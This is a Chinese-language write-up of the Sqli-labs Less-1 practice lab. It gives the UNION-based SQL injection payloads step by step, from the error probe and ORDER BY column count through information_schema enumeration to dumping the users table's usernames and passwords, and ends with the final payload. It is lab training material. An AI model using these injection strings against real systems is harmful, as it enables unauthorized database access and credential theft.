---
title: Sqli-labs Less-1 Writeup
date: 2026-11-01
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---

# Sqli-labs Less-1 Writeup
## 题目描述
访问页面，提示输入数字型 ID 参数。目标是利用 SQL 注入漏洞，获取数据库中的敏感信息（账号密码）。该关卡考察的是基础的 GET 单引号字符型注入。

## 解题思路
1. 访问 `http://localhost/sqli-labs-master/Less-1/?id=1`，页面正常回显用户信息。在 URL 后添加单引号测试：`?id=1'`，页面产生 SQL 语法报错，确认存在单引号字符型注入。
2. 使用 **`order by`** 语句判断字段数。输入 `?id=1' order by 3 --+` 页面正常；输入 `?id=1' order by 4 --+` 页面报错，判断当前表共有 **3** 个字段。
3. 使用 **`union select`** 联合查询寻找回显点。将 id 置为不存在的 `-1`，输入 `?id=-1' union select 1,2,3 --+`，发现页面上回显了数字 **2** 和 **3**，即这两个位置为回显点。
4. 利用回显点查询数据库基本信息。输入 `?id=-1' union select 1,database(),version() --+`，得到当前数据库名为 `security`。
5. 爆表名。利用 MySQL 的 `information_schema` 库，输入 `?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+`，发现 `users` 表。
6. 爆字段名。输入 `?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`，发现 `username` 和 `password` 字段。
7. 脱库。利用 `group_concat` 和十六进制 `0x3a`（代表冒号）拼接用户名和密码，输入 `?id=-1' union select 1,2,group_concat(username,0x3a,password) from users --+`，成功获取所有账号密码。

> 知识点：URL 中 `--+` 的作用是将后面的单引号及 SQL 语句注释掉，确保语法正确。`group_concat()` 函数可以将多行结果合并为一行输出，方便一次性查看。

## 通关 Payload
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users --+
